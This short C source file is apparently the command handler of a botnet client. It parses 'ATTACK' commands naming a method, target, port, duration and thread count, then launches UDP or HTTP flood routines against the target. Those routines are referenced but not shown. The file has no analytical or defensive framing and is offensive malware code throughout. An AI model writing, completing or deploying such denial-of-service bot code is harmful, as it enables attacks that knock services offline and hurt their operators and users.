#include "bot.h"

void execute_attack_command(const char* command) {
    char method[50], target[256];
    int port, duration, threads;
    
    // Parse command: ATTACK <method> <target> <port> <duration> <threads>
    if (sscanf(command, "ATTACK %49s %255s %d %d %d", 
               method, target, &port, &duration, &threads) == 5) {
        
        printf("Executing attack: %s on %s:%d for %ds with %d threads\n",
               method, target, port, duration, threads);
        
        if (strcmp(method, "UDP") == 0) {
            start_udp_flood(target, port, duration, threads);
        }
        else if (strcmp(method, "HTTP") == 0) {
            start_http_flood(target, port, duration, threads);
        }
        else {
            printf("Unknown attack method: %s\n", method);
        }
    } else {
        printf("Invalid command format: %s\n", command);
    }
}
